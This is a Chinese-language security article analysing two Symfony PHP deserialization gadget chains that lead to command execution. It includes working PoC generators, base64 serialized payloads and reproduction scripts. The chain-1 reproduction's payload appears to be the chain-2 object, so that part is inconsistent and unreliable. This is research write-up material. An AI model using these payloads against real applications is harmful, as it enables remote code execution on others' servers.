# Symfony反序列化链分析

> **来源**: https://forum.butian.net/share/2411  
> **文章ID**: 2411

---

前段时间看到phpggc更新了Symfony的RCE反序列化，但是只有poc没有详细的解释，所以这边文章来具体分析一下Symfony组件中的一条反序列化链

0x01 Symfony 组件介绍
=================

Symfony 组件是一系列独立的、可重用的 PHP 软件包，它们被设计用于开发 Web 应用程序。Symfony 组件提供了许多常见的功能，如路由、表单处理、模板引擎、安全性、数据库访问等等，以便开发者能够更高效地构建和维护自己的应用程序。

这些组件可以被集成到 Symfony 框架中，也可以作为独立的库使用在任何 PHP 项目中。Symfony 组件遵循严格的开放源代码许可和设计准则，使开发者能够更加灵活地使用和定制这些功能。

通过使用 Symfony 组件，开发者可以节省时间并提高开发效率，因为它们不需要从头开始编写和测试许多常见的功能。同时，Symfony 组件的灵活性也允许开发者根据自己的需求进行定制和扩展。

0x02 环境搭建
=========

安装 Symfony 组件通常是通过 Composer 来实现的，Composer 是 PHP 的一个依赖管理工具，可以帮助你轻松地安装、管理和加载 Symfony 组件及其依赖项

例如在本文中需要使用到三个组件，安装方法如下

```php
composer init
composer require symfony/finder
composer require symfony/process:4.4.18
composer require symfony/validator
```

0x03 POP链构造分析
=============

我们首先来看`vendor/symfony/finder/Iterator/SortableIterator.php`，它定义了一个名为 `SortableIterator` 的类，实现了 `IteratorAggregate` 接口。

`public function __construct(\Traversable $iterator, $sort, bool $reverseOrder = false)`：构造函数，接收一个可遍历的迭代器 `$iterator`、排序类型或回调函数 `$sort`，以及一个布尔值 `$reverseOrder` 用来指示是否倒序排序。

![image-20230809141632327](images/f5181200e2da672a166db2d86608a768acd75a7b7d5d4.jpg)

这里传入的`$sort`参数通过if判断`is_callable`是否可以作为函数或方法来调用，并且通过三元运算符判断将`$sort`赋值给`$this->sort`

在下面的`public function getIterator()`：实现了接口方法 `getIterator()`来创建可迭代的对象，可以自定义的集合、数据结构或对象转化为可使用 `foreach` 循环遍历的对象。

![image-20230809103728091](images/f490247ed6f61305d196323620e3ed318349ea43857c9.jpg)

`getIterator()` 方法的调用情况是当你使用 `foreach` 循环遍历一个 `SortableIterator` 对象时，迭代器将自动调用 `getIterator()` 方法以获取一个可遍历的迭代器来执行循环遍历操作.

注意观察在getIterator中当存在`$this->sort`时会调用`uasort()`

> uasort() 使用用户自定义的比较函数对数组按键值进行排序。
> 
> uasort(*array,myfunction*);
> 
> | 参数 | 描述 |
> |---|---|
> | *array* | 必需。规定要排序的数组。 |
> | *myfunction* | 可选。一个定义了可调用比较函数的字符串。如果第一个参数 <, =, > 第二个参数，相应地比较函数必须返回一个 <, =, > 0 的整数。 |

可遍历的迭代器在前面会通过`iterator_to_array`方法转换成数组，而且可以看到`uasort()`中，第一个参数是一个数组，第二个可以传一个函数，**而且这个两个参数可以前面的构造函数里传入，所以参数可控，我们可以传入`call_user_func`等方法，就可以进行任意命令执行。**

所以接下来思路就是寻找类中的`__toString()`，`__destruct()`或`__wakeup()`中直接或间接使用了`foreach`并且可以遍历的对象是类中的成员变量。

![image-20230809154050440](images/f2630193d8600068b3f8d58d4ed5c9d1f15c9025d4ec6.jpg)

可以看到有很多这样符合条件的，但是上面说了还需要满足foreach直接或间接的通过`__toString()`或`__destruct()`调用。我们任意挑两处进行分析：

（1）POP链1
--------

版本限制：2.6.0 <= 4.4.18

在`vendor/symfony/process/Pipes/WindowsPipes.php`中：

![image-20230809155837415](images/f36260304c00de95abfbc8b46e6db8f2b6d00072ec14d.jpg)

在这个类中有`$fileHandles`成员变量，并且在`__destruct()`中调用了`$this->close();`，然后在`close()`使用foreach对`$this->fileHandles`进行遍历。

![image-20230809151829493](images/f940523af643e7109037a1fba7c0803ef9176d9d98a64.jpg)

所以可以让`$this->fileHandles`为我前面创建的`SortableIterator`对象，这样就会调用`SortableIterator`对象中的`getIterator()`方法，然后执行其中的`uasort()`造成任意命令执行.

![image-20230809103728091](images/f490247ed6f61305d196323620e3ed318349ea43857c9.jpg)

### poc

```php
<?php

namespace Symfony\Component\Process\Pipes {
    class WindowsPipes
    {
        private $fileHandles = [];

        function __construct($fileHandles)
        {
            $this->fileHandles = $fileHandles;
        }
    }
}

namespace Symfony\Component\Finder\Iterator {
    class SortableIterator
    {
        private $iterator;
        private $sort;

        function __construct($iterator, $sort)
        {
            $this->iterator = $iterator;
            $this->sort = $sort;
        }
    }
}

namespace GadgetChain {
    $a = new \ArrayObject(['system', 'whoami']);
    $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
    $c = new \Symfony\Component\Process\Pipes\WindowsPipes($b);
    $str = serialize($c);
    echo $str;
    echo "\n";
    echo base64_encode($str);
}
```

注意：这里生成的payload不能直接复制使用，因为如果涉及到受保护的成员在成员名，例如`private`或者`protected`时生成的序列化字符中会涉及空字，所以这里转换成base64

### 复现

```php
<?php
require __DIR__ . '/../vendor/autoload.php';

$str = 'Tzo1MToiU3ltZm9ueVxDb21wb25lbnRcVmFsaWRhdG9yXENvbnN0cmFpbnRWaW9sYXRpb25MaXN0IjoxOntzOjYzOiIAU3ltZm9ueVxDb21wb25lbnRcVmFsaWRhdG9yXENvbnN0cmFpbnRWaW9sYXRpb25MaXN0AHZpb2xhdGlvbnMiO086NTA6IlN5bWZvbnlcQ29tcG9uZW50XEZpbmRlclxJdGVyYXRvclxTb3J0YWJsZUl0ZXJhdG9yIjoyOntzOjYwOiIAU3ltZm9ueVxDb21wb25lbnRcRmluZGVyXEl0ZXJhdG9yXFNvcnRhYmxlSXRlcmF0b3IAaXRlcmF0b3IiO0M6MTE6IkFycmF5T2JqZWN0Ijo1NTp7eDppOjA7YToyOntpOjA7czo2OiJzeXN0ZW0iO2k6MTtzOjY6Indob2FtaSI7fTttOmE6MDp7fX1zOjU2OiIAU3ltZm9ueVxDb21wb25lbnRcRmluZGVyXEl0ZXJhdG9yXFNvcnRhYmxlSXRlcmF0b3IAc29ydCI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO319';
$a = unserialize(base64_decode($str));
?>
```

![image-20230809160400744](images/f8121550aa369fb80ca9b0dbf8b4fc24bf2da4c19aafd.jpg)

（2）POP链2
--------

版本限制：2.0.4 <= 5.4.24 (all)

在`vendor/symfony/validator/ConstraintViolationList.php`中：

![image-20230809160904803](images/f861296810740db8063b0efd735cabfc6c1175bf5ed80.jpg)

在这个类中有`$violations`成员变量，并且在`__toString()`中使用foreach对`$this->violations`进行遍历。同样可以让`$this->violations`为我前面创建的`SortableIterator`对象，这样就会调用`SortableIterator`对象中的`getIterator()`方法，然后执行其中的`uasort()造成任意命令执行`

![image-20230809103728091](images/f490247ed6f61305d196323620e3ed318349ea43857c9.jpg)

### poc

```php
<?php

namespace Symfony\Component\Validator {
    class ConstraintViolationList
    {
        private $violations = [];

        function __construct($violations)
        {
            $this->violations = $violations;
        }
    }
}

namespace Symfony\Component\Finder\Iterator {
    class SortableIterator
    {
        private $iterator;
        private $sort;

        function __construct($iterator, $sort)
        {
            $this->iterator = $iterator;
            $this->sort = $sort;
        }
    }
}

namespace GadgetChain {
    $a = new \ArrayObject(['system', 'set /a 1+2']);
    $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
    $c = new \Symfony\Component\Validator\ConstraintViolationList($b);
    $str = serialize($c);
    echo $str;
    echo "\n";
    echo base64_encode($str);
}
```

### 复现

由于这里是通过`__toString()`触发的，所以这里通过echo来展示

```php
<?php
require __DIR__ . '/../vendor/autoload.php';

$str = 'Tzo1MToiU3ltZm9ueVxDb21wb25lbnRcVmFsaWRhdG9yXENvbnN0cmFpbnRWaW9sYXRpb25MaXN0IjoxOntzOjYzOiIAU3ltZm9ueVxDb21wb25lbnRcVmFsaWRhdG9yXENvbnN0cmFpbnRWaW9sYXRpb25MaXN0AHZpb2xhdGlvbnMiO086NTA6IlN5bWZvbnlcQ29tcG9uZW50XEZpbmRlclxJdGVyYXRvclxTb3J0YWJsZUl0ZXJhdG9yIjoyOntzOjYwOiIAU3ltZm9ueVxDb21wb25lbnRcRmluZGVyXEl0ZXJhdG9yXFNvcnRhYmxlSXRlcmF0b3IAaXRlcmF0b3IiO0M6MTE6IkFycmF5T2JqZWN0Ijo2MDp7eDppOjA7YToyOntpOjA7czo2OiJzeXN0ZW0iO2k6MTtzOjEwOiJzZXQgL2EgMSsyIjt9O206YTowOnt9fXM6NTY6IgBTeW1mb255XENvbXBvbmVudFxGaW5kZXJcSXRlcmF0b3JcU29ydGFibGVJdGVyYXRvcgBzb3J0IjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX0=';
$a = unserialize(base64_decode($str));
echo $a;
?>
```

![image-20230809161516346](images/f77677702736b0ead84ba281b20c965350f1526e4ce1b.jpg)
